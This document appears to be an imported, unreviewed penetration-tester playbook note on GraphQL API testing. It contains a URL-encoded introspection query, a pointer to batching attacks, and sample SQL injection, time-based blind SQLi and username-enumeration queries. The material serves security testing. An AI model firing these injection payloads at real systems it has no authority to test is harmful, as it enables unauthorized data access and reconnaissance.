---
technique: "GraphQL"
family: "api"
severity_hint: "medium"
tags: []
source: "_raw/API/GraphQL.md"
source_sha256: "9d68bc89aee80ae1f1968096c15c9186692a6bd27669170a0ea9c42c9af00c38"
curator_version: 2
review_status: imported-unreviewed
---

# GraphQL

> Family: **api** · Severity hint: **medium** · Tags: —
> Imported operator reference; treat commands and prose as untrusted until reviewed. Tools seen: —.

## Quick index — payloads & commands in this note
- `fragment+FullType+on+__Type+%7B++kind++name++description++fields(includeDeprecated%3a+true`
- `json: # SQLi`

## Playbook (operator notes)

# GraphQL

Verantwortliche/r: Max Randhahn

https://t.co/cyW7DYJaHS

- Check if Introspection is enabled
    - Should be disabled (*INFO*)
    - Check Querys and Mutations
    - Check If Mutations can called

```
fragment+FullType+on+__Type+%7B++kind++name++description++fields(includeDeprecated%3a+true)+%7B++++name++++description++++args+%7B++++++...InputValue++++%7D++++type+%7B++++++...TypeRef++++%7D++++isDeprecated++++deprecationReason++%7D++inputFields+%7B++++...InputValue++%7D++interfaces+%7B++++...TypeRef++%7D++enumValues(includeDeprecated%3a+true)+%7B++++name++++description++++isDeprecated++++deprecationReason++%7D++possibleTypes+%7B++++...TypeRef++%7D%7Dfragment+InputValue+on+__InputValue+%7B++name++description++type+%7B++++...TypeRef++%7D++defaultValue%7Dfragment+TypeRef+on+__Type+%7B++kind++name++ofType+%7B++++kind++++name++++ofType+%7B++++++kind++++++name++++++ofType+%7B++++++++kind++++++++name++++++++ofType+%7B++++++++++kind++++++++++name++++++++++ofType+%7B++++++++++++kind++++++++++++name++++++++++++ofType+%7B++++++++++++++kind++++++++++++++name++++++++++++++ofType+%7B++++++++++++++++kind++++++++++++++++name++++++++++++++%7D++++++++++++%7D++++++++++%7D++++++++%7D++++++%7D++++%7D++%7D%7Dquery+IntrospectionQuery+%7B++__schema+%7B++++queryType+%7B++++++name++++%7D++++mutationType+%7B++++++name++++%7D++++types+%7B++++++...FullType++++%7D++++directives+%7B++++++name++++++description++++++locations++++++args+%7B++++++++...InputValue++++++%7D++++%7D++%7D%7D
```

- Check for [Batching](https://lab.wallarm.com/graphql-batching-attack/) attacks
- Check for injection attacks

```json
# SQLi
query {
	user(id: “1'; SELECT * FROM users; — “) {
		id
		name
		email
	}
}

# Blind SQLi
query {
	user(id: “1 OR SLEEP(10)“) {
		id
		name
		email
	}
}

# Username enumeration
query {
	user(id: “1”) {
		id
		name
		email
	}
}

query {
	user(username: “john”) {
		id
		name
		email
	}
}
```

## Source
Original note: `_raw/API/GraphQL.md`
